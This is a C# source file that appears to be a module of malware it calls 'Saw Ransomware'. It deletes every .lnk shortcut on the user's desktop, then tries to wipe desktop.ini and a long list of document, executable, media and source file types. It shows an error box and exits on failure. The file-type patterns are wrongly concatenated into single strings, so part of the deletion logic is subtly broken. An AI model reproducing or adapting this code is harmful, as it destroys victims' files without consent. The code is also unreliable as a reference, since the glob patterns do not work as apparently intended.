using System;
using System.Collections.Generic;
using System.IO; //Add This
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Saw.DeleteDesktopFiles
{
    class DeleteDesktopFilesSaw
    {
        public void SawDeleteFilesDesktop()
        {
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            DirectoryInfo sawdesk = new DirectoryInfo(desktop);
            FileInfo[] saaw = sawdesk.GetFiles("*.lnk");
            foreach (FileInfo bjksaw in saaw)
            {
                bjksaw.Attributes = FileAttributes.Normal;
                bjksaw.Delete();
            }
            DirectoryInfo sawini = new DirectoryInfo(desktop);
            FileInfo[] bnjzmsaw = sawini.GetFiles("desktop.ini" + "*.ini");
            foreach (FileInfo saw in bnjzmsaw)
            {
                saw.Attributes = FileAttributes.Normal;
                saw.Delete();
            }
            DirectoryInfo direc = new DirectoryInfo(desktop);
            FileInfo[] vnsaw = direc.GetFiles("*.pdf" + "*.exe" + "*.txt" + "*.rtf" + "*.doc" + "*.cs" + "*.h" + "*.cpp" + "*.mp3" + "*.wav" + "*.ogg" + "*.chr" + "*.png" + "*.jpg" + "*.png" + "*.html" + "*.css");
            foreach(FileInfo zxsaw in vnsaw)
            {
                try
                {
                    zxsaw.Attributes = FileAttributes.Normal;
                    zxsaw.Delete();
                }
                catch(Exception ex)
                {
                    MessageBox.Show("Error: " + Environment.NewLine + ex.Message, "Saw Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Environment.Exit(505930);
                }
            }
        }
    }
}
